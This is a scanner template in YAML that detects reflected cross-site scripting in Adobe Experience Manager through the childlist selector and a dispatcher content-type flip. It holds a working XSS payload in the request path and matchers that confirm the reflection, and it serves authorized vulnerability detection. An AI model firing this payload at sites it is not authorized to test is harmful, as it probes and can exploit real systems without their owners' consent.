id: "aem-xss-childlist-selector"
name: "Adobe Experience Manager - Cross-Site Scripting"
severity: "high"
description: "Adobe Experience Manager contains a cross-site scripting vulnerability via requests using the selector childlist when the dispatcher does not respect the content-type responded by AEM and flips from application/json to text/html. As a consequence, the reflected suffix is executed and interpreted in the browser."
tech:
  - "aem"
tags:
  - "xss"
  - "aem"
  - "adobe"
  - "misconfig"
  - "vuln"
reference: "https://github.com/thomashartm/burp-aem-scanner/blob/master/src/main/java/burp/actions/xss/FlippingTypeWithChildrenlistSelector.java"
spaExclusion: true
request:
  method: "GET"
  path: "/etc/designs/xh1x.childrenlist.json//<svg onload=alert(document.domain)>.html"
control:
  method: "GET"
  path: "/.kovo-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "word"
    part: "body"
    words:
      - "<svg onload=alert(document.domain)>"
      - "{\"path\":\"/etc/designs/xh1x.childrenlist.json"
    condition: "and"
  - type: "word"
    part: "header"
    words:
      - "text/html"
  - type: "status"
    status:
      - 200
